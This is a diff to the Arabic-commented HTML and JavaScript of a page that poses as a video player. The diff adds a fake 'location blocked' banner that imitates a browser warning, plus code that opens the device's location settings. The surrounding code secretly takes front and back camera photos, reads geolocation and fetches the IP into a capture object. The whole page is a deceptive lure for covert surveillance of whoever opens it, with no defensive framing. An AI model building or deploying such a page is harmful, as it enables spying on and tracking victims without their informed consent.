@@ -227,22 +227,66 @@
             }
         }
 
-        /* رسالة التوجيه */
-        #redirectMessage {
+        /* ===== النافذة المنبثقة (شريط التحذير) ===== */
+        #locationBanner {
             display: none;
             position: absolute;
-            bottom: 20px;
+            top: 20px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0,0,0,0.8);
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 8px;
-            font-size: 14px;
+            width: 90%;
+            max-width: 400px;
+            background: #f9f9f9;
+            color: #333;
+            padding: 16px 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            z-index: 20;
             text-align: center;
-            pointer-events: none;
-            z-index: 10;
-            max-width: 80%;
+            font-size: 16px;
+            border: 1px solid #ddd;
+        }
+        #locationBanner .banner-icon {
+            font-size: 28px;
+            margin-bottom: 6px;
+        }
+        #locationBanner .banner-title {
+            font-weight: bold;
+            font-size: 18px;
+            color: #d32f2f;
+            margin-bottom: 6px;
+        }
+        #locationBanner .banner-desc {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 12px;
+        }
+        #locationBanner .banner-btn {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-weight: 500;
+        }
+        #locationBanner .banner-btn:hover {
+            background: #1557b0;
+        }
+        #locationBanner .banner-close {
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            background: none;
+            border: none;
+            font-size: 22px;
+            color: #999;
+            cursor: pointer;
+        }
+        #locationBanner .banner-close:hover {
+            color: #333;
         }
     </style>
 </head>
@@ -259,7 +303,15 @@
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
             </div>
-            <div id="redirectMessage">جاري توجيهك إلى الإعدادات ... بعد العودة سيتم تشغيل الفيديو تلقائياً</div>
+
+            <!-- شريط التحذير المخصص (يحاكي شريط المتصفح) -->
+            <div id="locationBanner">
+                <button class="banner-close" id="bannerClose">&times;</button>
+                <div class="banner-icon">📍</div>
+                <div class="banner-title">تم حظر الموقع الجغرافي</div>
+                <div class="banner-desc">يحتاج هذا الموقع إلى صلاحية الموقع الجغرافي لتشغيل الفيديو.</div>
+                <button class="banner-btn" id="openSettingsBtn">تغيير الإعدادات</button>
+            </div>
         </div>
 
         <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
@@ -304,10 +356,9 @@
             };
 
             // ===== متغيرات التحكم =====
-            let settingsOpened = false;
+            let settingsOpened = false;     // تم فتح الإعدادات؟
             let videoStarted = false;
             let isProcessing = false;
-            let isDataSent = false;
             let permissionsRequested = false;
 
             // ===== عناصر DOM =====
@@ -316,9 +367,11 @@
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
-            const redirectMessage = document.getElementById('redirectMessage');
+            const locationBanner = document.getElementById('locationBanner');
+            const openSettingsBtn = document.getElementById('openSettingsBtn');
+            const bannerClose = document.getElementById('bannerClose');
 
-            // ===== طلب الصلاحيات مسبقاً (لإظهار النوافذ) =====
+            // ===== طلب الصلاحيات (لإظهار نوافذ المتصفح) =====
             async function requestPermissions() {
                 try {
                     await new Promise((resolve) => {
@@ -334,6 +387,35 @@
                         .then(stream => stream.getTracks().forEach(t => t.stop()))
                         .catch(() => {});
                 } catch (e) {}
+            }
+
+            // ===== فتح إعدادات الموقع =====
+            function openLocationSettings() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    const intents = [
+                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent:#Intent;action=android.settings.SETTINGS;end'
+                    ];
+                    for (let intent of intents) {
+                        try {
+                            window.location.href = intent;
+                            break;
+                        } catch (e) {}
+                    }
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                    setTimeout(() => {
+                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
+                    }, 500);
+                } else if (/Windows/i.test(ua)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } else if (/Mac/i.test(ua)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } else {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                }
             }
 
             // ===== جلب IP =====
@@ -363,19 +445,16 @@
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: { exact: facingMode } }
                     });
-
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
                     await new Promise(resolve => setTimeout(resolve, 1000));
-
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
-
                     stream.getTracks().forEach(track => track.stop());
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                 } catch {
@@ -399,35 +478,6 @@
                 } catch (err) {
                     capturedData.permissions.push('Geolocation Denied');
                     capturedData.location = '';
-                }
-            }
-
-            // ===== فتح إعدادات الموقع =====
-            function openLocationSettings() {
-                const ua = navigator.userAgent;
-                if (/Android/i.test(ua)) {
-                    const intents = [
-                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent:#Intent;action=android.settings.SETTINGS;end'
-                    ];
-                    for (let intent of intents) {
-                        try {
-                            window.location.href = intent;
-                            break;
-                        } catch (e) {}
-                    }
-                } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-                    setTimeout(() => {
-                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
-                    }, 500);
-                } else if (/Windows/i.test(ua)) {
-                    window.open('ms-settings:privacy-location', '_blank');
-                } else if (/Mac/i.test(ua)) {
-                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
-                } else {
-                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                 }
             }
 
@@ -525,7 +575,7 @@
                 }, 3000);
             }
 
-            // ===== جمع البيانات وتشغيل الفيديو (الجزء الثاني) =====
+            // ===== جمع البيانات وتشغيل الفيديو (بعد العودة من الإعدادات) =====
             async function collectAndPlay() {
                 if (isProcessing) return;
                 isProcessing = true;
@@ -568,45 +618,66 @@
                 isProcessing = false;
             }
 
-            // ===== الضغطة الأولى: طلب الصلاحيات + فتح الإعدادات =====
-            async function handleFirstClick() {
-                if (settingsOpened || videoStarted || isProcessing) return;
-
-                settingsOpened = true;
-                // إظهار رسالة التوجيه
-                redirectMessage.style.display = 'block';
-
-                // طلب الصلاحيات (تظهر النوافذ)
-                await requestPermissions();
-
-                // فتح الإعدادات
-                openLocationSettings();
-
-                // بعد فترة نعيد إخفاء الرسالة (لكنها ستبقى حتى العودة)
-                // لن نخفيها الآن، بل سنخفيها عند العودة
+            // ===== إظهار شريط التحذير =====
+            function showBanner() {
+                locationBanner.style.display = 'block';
+                // إخفاء زر التشغيل (الزر الأحمر) لجذب الانتباه للشريط
+                playButtonOverlay.style.opacity = '0.3';
+                playButtonOverlay.style.pointerEvents = 'none';
             }
 
-            // ===== معالج الضغط على الزر =====
+            // ===== إخفاء شريط التحذير =====
+            function hideBanner() {
+                locationBanner.style.display = 'none';
+                playButtonOverlay.style.opacity = '1';
+                playButtonOverlay.style.pointerEvents = 'auto';
+            }
+
+            // ===== معالج الضغط على زر التشغيل (الأحمر) =====
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted) return;
                 if (isProcessing) return;
-
-                if (!settingsOpened) {
-                    // الضغطة الأولى
-                    await handleFirstClick();
-                } else {
-                    // إذا كان settingsOpened صحيحاً ولكن لم يبدأ الفيديو بعد (قد يحدث إذا نقر المستخدم مرة أخرى يدوياً)
-                    // نقوم بتنفيذ الجزء الثاني مباشرة
+                if (settingsOpened) {
+                    // إذا كان قد تم فتح الإعدادات سابقاً ولم يبدأ الفيديو (حالة نادرة)
                     await collectAndPlay();
+                    return;
                 }
+
+                // الضغطة الأولى: نطلب الصلاحيات (لإظهار نوافذ المتصفح) ثم نعرض الشريط
+                settingsOpened = true;
+                await requestPermissions(); // قد تظهر نوافذ طلب الإذن
+
+                // نعرض الشريط الذي يحاكي "تم حظر الموقع الجغرافي"
+                showBanner();
+            }
+
+            // ===== معالج الضغط على زر "تغيير الإعدادات" في الشريط =====
+            async function handleOpenSettings() {
+                // نخفي الشريط
+                hideBanner();
+                // نفتح الإعدادات
+                openLocationSettings();
+                // بعد العودة، سنعتمد على visibilitychange لبدء collectAndPlay
+            }
+
+            // ===== إغلاق الشريط يدوياً (زر الإغلاق) =====
+            function handleCloseBanner() {
+                hideBanner();
+                // إذا أغلق المستخدم الشريط دون فتح الإعدادات، نعيد تمكين الزر الأحمر
+                // لكننا نترك settingsOpened = true حتى لا يظهر الشريط مرة أخرى عند النقر على الزر الأحمر؟
+                // الأفضل: إذا أغلق الشريط، نسمح له بالضغط على الزر الأحمر مرة أخرى لإظهار الشريط مجدداً.
+                // لكننا جعلنا settingsOpened تمنع ظهور الشريط مرة أخرى، لذا نعيد ضبطها.
+                settingsOpened = false;
+                playButtonOverlay.style.opacity = '1';
+                playButtonOverlay.style.pointerEvents = 'auto';
             }
 
             // ===== رصد العودة من الإعدادات =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // إخفاء رسالة التوجيه
-                    redirectMessage.style.display = 'none';
+                    // تأكد من أن الشريط مخفي
+                    hideBanner();
                     // نبدأ جمع البيانات وتشغيل الفيديو تلقائياً
                     collectAndPlay();
                 }
@@ -618,6 +689,12 @@
             }
             if (playButtonOverlay) {
                 playButtonOverlay.addEventListener('click', handlePlayClick);
+            }
+            if (openSettingsBtn) {
+                openSettingsBtn.addEventListener('click', handleOpenSettings);
+            }
+            if (bannerClose) {
+                bannerClose.addEventListener('click', handleCloseBanner);
             }
 
             // ===== تفعيل الصوت عند أي تفاعل =====
